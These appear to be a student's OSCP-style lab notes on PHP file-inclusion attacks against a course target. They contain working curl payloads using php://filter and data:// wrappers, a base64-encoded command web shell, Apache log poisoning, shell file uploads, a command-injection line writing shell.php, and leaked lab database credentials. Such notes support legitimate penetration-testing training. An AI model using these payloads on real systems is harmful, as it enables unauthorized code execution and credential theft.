 examine the¬†**php://filter**[1](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_59-1)¬†and¬†**data:// ....:
can also encode with base64 or ROT13 

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

or

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

output:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...

also can do dir traversals for resource like so:
curl 192.168.242.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/backup.php

```

we then decode this and find:
```
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

username and pass right there üëÄ

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

using data tag we can try to execute php code if poisoning doesnt work.

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. can try to use the¬†**data://**¬†wrapper with base64-encoded data.

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

**PHP allow_url_fopen & allow_url_include (OSCP Notes)**

‚Ä¢ **allow_url_fopen=On** ‚Üí Can fetch remote files (file_get_contents(), fopen())

‚Ä¢ **allow_url_include=On** ‚Üí Can directly execute remote PHP files via include()

‚Ä¢ **Both Off** ‚Üí Need **LFI, log poisoning, or file upload** for execution

‚Ä¢ **Bypass Trick**: Use **base64-encoded data:// wrapper**

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=
```

  

‚Ä¢ **Check PHP settings** via:

```
<?php phpinfo(); ?>
```

  üî• **OSCP Tip**: If RFI fails, try **LFI + log poisoning** for code execution.

**Where to Include <?php phpinfo(); ?> for Exploitation**

  

Including phpinfo(); helps check PHP settings (like allow_url_fopen, allow_url_include, and disable_functions).

  

**1Ô∏è‚É£ Inject into an LFI Vulnerability**

  

If you find a Local File Inclusion (LFI) vulnerability:

```
?page=php://filter/convert.base64-encode/resource=config.php
```

‚Ä¢ Try injecting your own PHP file in an upload directory.

‚Ä¢ If you can write logs (/var/log/apache2/access.log), poison the logs with:

```
User-Agent: <?php phpinfo(); ?>
```

Then load the logs:

```
?page=../../../../var/log/apache2/access.log
```

  

  

**2Ô∏è‚É£ Upload a Malicious PHP File**

‚Ä¢ If a file upload is allowed, upload:

```
<?php phpinfo(); ?>
```

  

‚Ä¢ Access it via:

```
http://target/uploads/shell.php
```

  

  

**3Ô∏è‚É£ Modify a Writable PHP File**

‚Ä¢ If you have write access to a PHP file (e.g., index.php):

```
echo "<?php phpinfo(); ?>" >> /var/www/html/index.php
```

  

‚Ä¢ Then visit:

```
http://target/index.php
```

  

  

**4Ô∏è‚É£ Command Injection (if possible)**

‚Ä¢ If you have command execution via eval(), system(), or popen():

```
; echo "<?php phpinfo(); ?>" > /var/www/html/shell.php ;
```

  

‚Ä¢ Access:

```
http://target/shell.php
```

üî• **OSCP Tip**:

Use phpinfo(); early to check security configs and find bypass techniques!